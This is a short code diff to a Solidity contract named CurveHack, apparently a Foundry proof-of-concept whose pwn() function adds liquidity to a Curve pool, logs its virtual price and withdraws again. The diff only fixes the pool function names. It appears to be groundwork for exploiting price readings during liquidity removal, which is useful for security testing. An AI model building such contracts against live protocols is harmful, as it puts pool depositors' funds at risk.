@@ -18,11 +18,11 @@ contract CurveHack is Constants {
     function pwn() external payable {
         // add liquidity
         uint256[2] memory amounts = [msg.value, ZERO_VALUE];
-        uint256 lp = POOL.addLiquidity{value: msg.value}(amounts, 1);
+        uint256 lp = POOL.add_liquidity{value: msg.value}(amounts, 1);
         // get virtual price
         console2.log("before removing LP - virtual price", POOL.get_virtual_price());
         // remove liquidity
         uint256[2] memory min_amounts = [ZERO_VALUE, ZERO_VALUE];
-        POOL.removeLiquidity(lp, min_amounts);
+        POOL.remove_liquidity(lp, min_amounts);
     }
 }
